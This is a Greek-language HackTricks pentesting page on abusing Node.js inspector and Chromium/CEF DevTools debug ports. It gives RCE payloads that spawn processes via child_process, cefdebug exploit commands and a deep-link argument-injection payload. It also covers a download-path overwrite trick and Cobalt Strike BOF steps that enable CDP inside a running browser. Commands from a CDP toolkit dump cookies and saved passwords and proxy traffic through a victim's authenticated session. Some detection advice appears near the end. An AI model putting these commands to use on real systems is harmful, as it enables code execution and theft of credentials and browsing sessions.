# Κατάχρηση Node inspector/CEF debug

{{#include ../../banners/hacktricks-training.md}}

Ιστορικά πρακτικά παραδείγματα περιλαμβάνουν το walkthrough του Multimaster και την επίθεση στον debugger του Visual Studio Code μέσω του CVE-2019-1414. Χρησιμοποιήστε τα ως πλαίσιο ειδικό για την αντίστοιχη έκδοση και μην υποθέτετε ότι κάθε τρέχων στόχος Electron ή Chromium εκθέτει τα ίδια primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Βασικές πληροφορίες

[Από την τεκμηρίωση](https://nodejs.org/learn/getting-started/debugging): Όταν εκκινηθεί με το switch `--inspect`, μια διεργασία Node.js ακούει για σύνδεση από client debugging. **Από προεπιλογή**, ακούει στη διεύθυνση host και στη θύρα **`127.0.0.1:9229`**. Σε κάθε διεργασία εκχωρείται επίσης ένα **μοναδικό** **UUID**.<sup>[[4]](#references)</sup>

Οι clients inspector πρέπει να γνωρίζουν και να καθορίζουν τη διεύθυνση host, τη θύρα και το UUID για να συνδεθούν. Ένα πλήρες URL θα μοιάζει κάπως έτσι: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Επειδή ο **debugger έχει πλήρη πρόσβαση στο περιβάλλον εκτέλεσης του Node.js**, ένας κακόβουλος παράγοντας που μπορεί να συνδεθεί σε αυτήν τη θύρα ενδέχεται να μπορεί να εκτελέσει αυθαίρετο κώδικα εκ μέρους της διεργασίας Node.js (**πιθανή κλιμάκωση προνομίων**).<sup>[[4]](#references)</sup>

Υπάρχουν διάφοροι τρόποι για να ξεκινήσετε έναν inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Όταν ξεκινήσετε μια διεργασία υπό επιθεώρηση, θα εμφανιστεί κάτι σαν το εξής:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Οι διεργασίες που βασίζονται στο **CEF** (**Chromium Embedded Framework**) μπορούν να εκθέσουν ένα debugger με `--remote-debugging-port=9222`. Αυτό εκθέτει το πρόγραμμα περιήγησης μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) και όχι μέσω ενός Node.js inspector, επομένως τα payloads που βασίζονται στο Node.js `process` δεν εφαρμόζονται απευθείας από προεπιλογή.<sup>[[2]](#references)[[5]](#references)</sup>

Όταν ξεκινήσετε ένα πρόγραμμα περιήγησης σε λειτουργία debug, θα εμφανιστεί κάτι σαν αυτό:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Απαρίθμηση και χειρισμός ενός CDP endpoint

Τα HTTP discovery endpoints διακρίνουν το WebSocket του **browser** από τα WebSocket μεμονωμένων **target** (καρτέλα, worker, extension κ.λπ.). Υποβάλετε ερώτημα στο `/json/version` για το endpoint του browser και στο `/json/list` για τα target· έπειτα, μπορείτε να χειριστείτε απευθείας τις τιμές `webSocketDebuggerUrl` που επιστρέφονται, χρησιμοποιώντας μηνύματα τύπου JSON-RPC του CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Για παράδειγμα, συνδεθείτε με `websocat "$BROWSER_WS"` και στείλτε `{"id":1,"method":"Target.getTargets"}` ή `{"id":2,"method":"Storage.getCookies"}`. Σε έναν στόχο σελίδας (`websocat "$PAGE_WS"`), η `Runtime.evaluate` εκτελείται στον renderer και η `Page.captureScreenshot` επιστρέφει ένα screenshot κωδικοποιημένο σε base64. Το `document.cookie` δεν μπορεί να αποκαλύψει cookies με `HttpOnly`, ενώ η `Storage.getCookies` ζητά από τον browser το cookie store του.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Browsers, WebSockets και same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Οι ιστότοποι που ανοίγουν σε web browser μπορούν να κάνουν αιτήματα WebSocket και HTTP στο πλαίσιο του μοντέλου ασφάλειας του browser. Απαιτείται μια **αρχική σύνδεση HTTP** για να **αποκτηθεί ένα μοναδικό debugger session id**. Η **same-origin policy** **εμποδίζει** τους ιστότοπους να κάνουν **αυτή τη σύνδεση HTTP**. Για πρόσθετη προστασία από [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** το Node.js επαληθεύει ότι οι **κεφαλίδες 'Host'** της σύνδεσης καθορίζουν είτε μια **διεύθυνση IP** είτε ακριβώς το **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Αυτό το **μέτρο ασφαλείας αποτρέπει την εκμετάλλευση του inspector** για την εκτέλεση κώδικα **απλώς στέλνοντας ένα αίτημα HTTP** (κάτι που θα μπορούσε να γίνει με εκμετάλλευση ενός SSRF vuln).<sup>[[4]](#references)</sup>

### Εκκίνηση του inspector σε εκτελούμενες διεργασίες

Μπορείτε να στείλετε το **σήμα SIGUSR1** σε μια εκτελούμενη διεργασία nodejs για να την κάνετε να **εκκινήσει τον inspector** στην προεπιλεγμένη θύρα. Ωστόσο, σημειώστε ότι χρειάζεστε επαρκή προνόμια, επομένως αυτό μπορεί να σας δώσει **προνομιακή πρόσβαση σε πληροφορίες μέσα στη διεργασία**, αλλά όχι άμεση κλιμάκωση προνομίων.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Αυτό είναι χρήσιμο σε containers, επειδή η **διακοπή της διεργασίας και η εκκίνηση μιας νέας** με `--inspect` **δεν αποτελεί επιλογή**, καθώς το **container** θα **τερματιστεί** μαζί με τη διεργασία.<sup>[[6]](#references)</sup>

### Σύνδεση στο inspector/debugger

Για σύνδεση σε browser **βασισμένο στο Chromium**, μπορείτε να μεταβείτε στις διευθύνσεις `chrome://inspect` ή `edge://inspect` για το Chrome ή το Edge, αντίστοιχα. Κάνοντας κλικ στο κουμπί Configure, θα πρέπει να βεβαιωθείτε ότι ο **host και η θύρα-στόχος** εμφανίζονται σωστά. Η εικόνα δείχνει ένα παράδειγμα Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Αφού εμφανιστεί μια διεύθυνση URL για πρόσβαση στο debugger. π.χ. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Σύνδεση στο inspector/debugger: Για σύνδεση σε browser βασισμένο στο Chromium,...](<../../images/image (674).png>)

Μπορείτε να συνδεθείτε σε debugger/inspector μέσω **γραμμής εντολών** με:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Το εργαλείο [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) επιτρέπει τον **εντοπισμό inspectors** που εκτελούνται τοπικά και το **inject code** σε αυτούς.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Σημειώστε ότι τα **NodeJS RCE exploits δεν θα λειτουργήσουν** αν συνδεθείτε σε ένα browser μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (πρέπει να ελέγξετε το API για να βρείτε ενδιαφέροντες τρόπους να το αξιοποιήσετε).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE στο NodeJS Debugger/Inspector

> [!TIP]
> Αν ήρθατε εδώ αναζητώντας πώς να αποκτήσετε [**RCE από ένα XSS στο Electron, δείτε αυτήν τη σελίδα.**](../../desktop-application-security/electron-desktop-apps/index.html)

Μερικοί συνηθισμένοι τρόποι για να αποκτήσετε **RCE** όταν μπορείτε να **συνδεθείτε** σε ένα Node **inspector** είναι να χρησιμοποιήσετε κάτι σαν το παρακάτω (φαίνεται ότι αυτό **δεν θα λειτουργήσει σε σύνδεση με το Chrome DevTools protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payloads του Chrome DevTools Protocol

Μπορείτε να ελέγξετε το API εδώ: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Σε αυτή την ενότητα θα παραθέσω απλώς ενδιαφέροντα πράγματα που έχω δει να χρησιμοποιούν για την εκμετάλλευση αυτού του protocol.

### Περιορισμός του προεπιλεγμένου profile από το Chrome 136 και μετά

Από το **Chrome 136** και μετά, το Chrome αγνοεί τα `--remote-debugging-port` και `--remote-debugging-pipe` όταν στοχεύουν στον **προεπιλεγμένο κατάλογο δεδομένων του Chrome**. Η επιλογή πρέπει να συνδυάζεται με μη τυπικό `--user-data-dir`, του οποίου το ξεχωριστό κλειδί κρυπτογράφησης και η απομονωμένη κατάσταση του browser εμποδίζουν την απλή τεχνική βασισμένη σε flags να εκθέσει το κανονικό, αυθεντικοποιημένο profile του χρήστη. Δεν πρέπει να θεωρείται ότι αυτός ο περιορισμός αφορά παλαιότερες εκδόσεις του Chrome, το Chrome for Testing, εφαρμογές Electron/CEF ή άλλες παραλλαγές του Chromium, χωρίς επαλήθευση.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Επομένως, το ότι βλέπουμε μια ενεργή διεργασία Chrome που εκκινήθηκε μόνο με `--remote-debugging-port` **δεν** αποδεικνύει ότι ενεργοποιήθηκε το CDP. Επιβεβαιώστε τον listener και το `/json/version` και προσδιορίστε ποιο profile χρησιμοποιείται στην πραγματικότητα.<sup>[[14]](#references)</sup>

### Εισαγωγή παραμέτρων μέσω Deep Links

Στο [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) η Rhino Security ανακάλυψε ότι μια εφαρμογή βασισμένη στο CEF **καταχώρισε ένα προσαρμοσμένο URI** στο σύστημα (workspaces://index.html), το οποίο λάμβανε ολόκληρο το URI και έπειτα **εκκινούσε την εφαρμογή που βασιζόταν στο CEF** με μια διαμόρφωση που κατασκευαζόταν εν μέρει από αυτό το URI.<sup>[[8]](#references)</sup>

Διαπιστώθηκε ότι οι παράμετροι του URI αποκωδικοποιούνταν ως URL και χρησιμοποιούνταν για την εκκίνηση της βασικής εφαρμογής CEF, επιτρέποντας σε έναν χρήστη να **εισαγάγει** το flag **`--gpu-launcher`** στη **γραμμή εντολών** και να εκτελέσει αυθαίρετες εντολές.<sup>[[8]](#references)</sup>

Έτσι, ένα payload όπως το εξής:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Θα εκτελέσει το calc.exe.<sup>[[8]](#references)</sup>

### Αντικατάσταση αρχείων

Αλλάξτε τον φάκελο στον οποίο **θα αποθηκεύονται τα ληφθέντα αρχεία** και κατεβάστε ένα αρχείο για να **αντικαταστήσετε** συχνά χρησιμοποιούμενο **πηγαίο κώδικα** της εφαρμογής με τον **κακόβουλο κώδικά** σας.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE και exfiltration

Η STAR Labs έδειξε ότι οι εκτεθειμένες υπηρεσίες WebDriver/CDP μπορούν να επιτρέψουν αυθαίρετες αναγνώσεις αρχείων και RCE· σε ορισμένες διαμορφώσεις, το DNS rebinding μπορεί να ολοκληρώσει την αλυσίδα exploit.<sup>[[9]](#references)</sup>

Η υπηρεσία WebDriver του ChromeDriver είναι διαφορετική από το Chrome DevTools/CDP. Η δυνατότητα [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) επιλέγει το εκτελέσιμο αρχείο του browser που εκκινείται για μια νέα συνεδρία. Αν ένας μη προνομιούχος caller μπορεί να αποκτήσει πρόσβαση σε υπηρεσία ChromeDriver που εκτελείται ως root και να υποβάλει μια συνεδρία με διαδρομή εκτελέσιμου αρχείου που ελέγχει ο ίδιος, η εκκίνηση αυτή μπορεί να διασχίσει το όριο δικαιωμάτων της υπηρεσίας. Μια κενή απόκριση `/sessions` δεν αρκεί για να καθοριστεί αν μπορούν να δημιουργηθούν νέες συνεδρίες. Πριν συμπεράνετε ότι η διαδρομή είναι αξιοποιήσιμη, ελέγξτε τον ιδιοκτήτη της διεργασίας, την πραγματική προσβασιμότητα του listener, την εξουσιοδότηση συνεδριών, την πρόσβαση στο εκτελέσιμο αρχείο και τους μηχανισμούς περιορισμού· μόνο το όνομα της διεργασίας ή η συνήθης θύρα δεν αρκούν. Οι [οδηγίες ασφαλείας της Google](https://developer.chrome.com/docs/chromedriver/security-considerations) συνιστούν την εκτέλεση του ChromeDriver με μη προνομιούχο λογαριασμό. Η παθητική απαρίθμηση δεν πρέπει να δημιουργεί συνεδρία WebDriver.

Για επιπλέον ιστορικές περιπτώσεις αυτοματοποίησης browser και ασφάλειας Chromium, δείτε το write-up του Counter WebDriver και τα ζητήματα 773, 1742 και 1944 του Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Ενεργοποίηση CDP μέσα σε ζωντανή διεργασία Chromium

Ο περιορισμός του Chrome για το προεπιλεγμένο προφίλ μπλοκάρει μόνο τη διαδρομή ενεργοποίησης μέσω γραμμής εντολών. Με επαρκή πρόσβαση ίδιου χρήστη για χειρισμό της διεργασίας του browser, τα αρχικά [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) και [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) του Cobalt Strike καλούν την μη εξαγόμενη `content::DevToolsAgentHost::StartRemoteDebuggingServer` του Chromium μέσα στην ήδη εκτελούμενη διεργασία `chrome.exe` ή `msedge.exe`. Επομένως, το endpoint ανήκει στο πραγματικό προφίλ και διατηρεί τις καρτέλες, τις επεκτάσεις, τα cookies και την κατάσταση αυθεντικοποίησής του.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Για συνήθεις διεργασίες Chrome/Edge x64, το BOF εντοπίζει το παράθυρο του browser και τις φορτωμένες `chrome.dll`/`msedge.dll`, σαρώνει το απομακρυσμένο PE για υπογραφές με μάσκες, δεσμεύει μνήμη για stubs και ένα μπλοκ context, αντικαθιστά προσωρινά τη διαδικασία παραθύρου και εκτελεί την τελική κλήση στο **νήμα UI** του browser. Οι σχετικές είσοδοι κατά την εκτέλεση είναι οι `StartRemoteDebuggingServer`, `operator new` του Chromium, `TCPServerSocketFactory::CreateForHttpServer` και το vtable του factory. Η εκτέλεση διακόπτεται αν οποιαδήποτε υποχρεωτική υπογραφή δεν έχει ακριβώς μία αντιστοιχία.<sup>[[15]](#references)[[16]](#references)</sup>

Το BOF δέχεται λειτουργία browser και προαιρετική θύρα. Στη συνέχεια, το βοηθητικό script μπορεί να επαληθεύσει το endpoint και να συλλέξει cookies· το `chrome-iso` είναι ξεχωριστή διαδρομή για το όριο απομόνωσης διεργασιών των Windows του Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Η διαδρομή `chrome-iso` χρησιμοποιεί μόνο handles με περιορισμένα δικαιώματα query προς την απομονωμένη διεργασία. Εντοπίζει το εγκατεστημένο `chrome.dll` του οποίου το μέγεθος εικόνας PE ταιριάζει με εκείνο της ενεργής διεργασίας, επιλύει symbols από αυτό το τοπικό image και αξιοποιεί το dispatch `WindowImpl` του Chromium, μαζί με σύγχρονο `WM_COPYDATA` και ένα hook του User32 που υπάρχει ήδη στο image, για να προσεγγίσει το UI thread.<sup>[[16]](#references)</sup>

> [!WARNING]
> Πρόκειται για τεχνική **χειρισμού διεργασίας browser μετά από παραβίαση**, όχι για παράκαμψη δικτύου χωρίς έλεγχο ταυτότητας. Εξαρτάται από το build, επειδή τα σχετικά C++ symbols δεν είναι exported και μπορεί να αλλάξουν μετά από ενημερώσεις του browser.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Ανανέωση signatures μετά από ενημερώσεις του browser

Χρησιμοποιήστε την ακριβή έκδοση του `chrome.dll` ή `msedge.dll` που είναι εγκατεστημένη στον στόχο και το αντίστοιχο PDB. Το `symchk.exe` από το Windows SDK κατεβάζει τα symbols· στη συνέχεια, τα scripts του repository εντοπίζουν το `StartRemoteDebuggingServer`, εξάγουν τα ορίσματα του allocator/socket-factory ή επικυρώνουν κάθε signature που είναι ενσωματωμένο στο BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Ένα αποτέλεσμα με μηδενικές ή πολλαπλές αντιστοιχίες δεν πρέπει να αντικαθίσταται από μια αυθαίρετη διεύθυνση. Αν ένα γνωστό μοτίβο `operator new` ή `CreateForHttpServer` έχει αλλάξει υπερβολικά για να χρησιμοποιηθεί ως βάση για νέα μάσκα, χρησιμοποιήστε το `pe_signature_finder.py` με το PDB για να εξετάσετε αυτό το σύμβολο και να βρείτε μια ακολουθία byte μοναδική στο module-στόχο.<sup>[[16]](#references)[[18]](#references)</sup>

#### Εξαγωγή μέσω αυθεντικοποιημένου browser με το CDP Toolkit

Αυτή η τεχνική δεν αποκρυπτογραφεί offline το App-Bound Encryption (ABE) ούτε αφαιρεί τη σύνδεση με τη συσκευή. Αντίθετα, χρησιμοποιεί τον νόμιμο browser ως **oracle αποκρυπτογράφησης και proxy για αυθεντικοποιημένες αλληλεπιδράσεις**: το `Storage.getCookies` ζητά από τον ενεργό browser τα cookies του, ενώ οι ροές εργασίας πλοήγησης/screencast διατηρούν τα αιτήματα, τον χώρο αποθήκευσης, την εταιρική αυθεντικοποίηση και τη συμπεριφορά που συνδέεται με τη συσκευή μέσα στον υπάρχοντα browser του θύματος.<sup>[[17]](#references)[[18]](#references)</sup>

Αφού δρομολογήσετε τον loopback CDP listener μέσω του pivot του operator, το [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) μπορεί να απαριθμήσει και να συλλέξει κοινά artifacts.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` και `tabs screenshot` είναι κυρίως wrappers γύρω από τα `/json/version`, τη λίστα target, το `Storage.getCookies` και το `Page.captureScreenshot`. Το ιστορικό, οι σελιδοδείκτες, οι επεκτάσεις και τα metadata κωδικών πρόσβασης απαιτούν αντίθετα ένα προσωρινό target `chrome://`/`edge://` WebUI: το toolkit περιμένει να αποδοθεί το περιβάλλον, εξετάζει το μοντέλο ή το DOM, συλλέγει το αποτέλεσμα και κλείνει το target.<sup>[[17]](#references)[[18]](#references)</sup>

Το `saved-passwords dump` πηγαίνει ένα βήμα παραπέρα: ανοίγει το πραγματικό origin αποθηκευμένης σύνδεσης, εστιάζει σε ένα πεδίο διαπιστευτηρίων, επιλέγει την εγγενή πρόταση autofill χρησιμοποιώντας συμβάντα εισόδου CDP και διαβάζει τις τιμές που συμπληρώθηκαν. Το origin/port/path πρέπει να ταιριάζει όσο το δυνατόν περισσότερο με το realm του αποθηκευμένου κωδικού πρόσβασης· η ορατή λειτουργία είναι η αξιόπιστη προεπιλογή, επειδή το αναδυόμενο παράθυρο προτάσεων είναι εγγενές UI του browser.<sup>[[17]](#references)[[18]](#references)</sup>

Για ζωντανή αλληλεπίδραση, το `browser-takeover screencast` μεταδίδει frames και στέλνει είσοδο σε ένα πραγματικό target (συμπεριλαμβανομένων των λειτουργιών παρασκηνίου ή εκτός οθόνης). Το `browser-takeover proxy` αντίθετα δέχεται τοπικά HTTP και HTTPS `CONNECT` και πραγματοποιεί upstream αιτήματα μέσω κρυφών Chrome targets, με fallback σε tabs παρασκηνίου όταν τα κρυφά targets δεν είναι διαθέσιμα· έτσι διατηρείται το δικτυακό/πιστοποιημένο περιβάλλον του θύματος, αλλά η πιστότητα είναι χαμηλότερη για σύνθετες client-side εφαρμογές, επειδή ο browser του χειριστή αποδίδει το περιεχόμενο που επιστρέφεται.<sup>[[17]](#references)[[18]](#references)</sup>

Για ανίχνευση, μην βασίζεστε μόνο στην τηλεμετρία γραμμής εντολών `--remote-debugging-*`: συσχετίστε επίσης ασυνήθιστα handles και λειτουργίες μνήμης με διεργασίες browser (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, δημιουργία thread), DLL injection και μη αναμενόμενα loopback listening sockets που ανήκουν σε Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Σε ένα πραγματικό περιβάλλον και **μετά την παραβίαση** ενός υπολογιστή χρήστη που χρησιμοποιεί browser βασισμένο στο Chromium, μια ιστορική τεχνική ήταν η επανεκκίνηση του browser με ενεργοποιημένο debugging και η προώθηση της loopback θύρας. Αυτό μπορεί να εκθέσει την κατάσταση περιήγησης του θύματος σε προϊόντα/builds που εξακολουθούν να δέχονται το επιλεγμένο profile, αλλά το Chrome 136+ δεν θα το επιτρέψει για τον προεπιλεγμένο κατάλογο δεδομένων του.<sup>[[7]](#references)[[14]](#references)</sup>

Η αρχική εντολή επανεκκίνησης διατηρείται παρακάτω για παλαιότερους ή συγκεκριμένης έκδοσης στόχους. Η δεύτερη εντολή είναι η υποστηριζόμενη μορφή για το τρέχον Chrome, αλλά δημιουργεί ένα απομονωμένο profile αντί να ανοίγει ξανά την κανονική πιστοποιημένη κατάσταση του θύματος.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Για τεχνικές relaunch, extension και CDP ειδικά για Chromium σε macOS, δείτε το [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Εργαλείο επιθεώρησης και εκμετάλλευσης του debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution στο Visual Studio Code μέσω του Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Οδηγός debugging του Node.js - Ξεκινώντας](https://nodejs.org/learn/getting-started/debugging)
- [5] [Πρωτόκολλο Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Κατάχρηση της λειτουργίας debugging του Chrome για απομακρυσμένη παρακολούθηση και έλεγχο συνεδριών περιήγησης](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution στο AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Μιλάς σε μένα; - WebDriver RCE μέσω DNS Rebinding και CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Από bot σε RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Αλλαγές στους διακόπτες remote debugging για βελτίωση της ασφάλειας - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Εισαγωγή CDP σε εκτελούμενο πρόγραμμα περιήγησης Edge: Μια εις βάθος ανάλυση της instrumentation προγράμματος περιήγησης κατά το runtime](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Η επιστροφή του Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
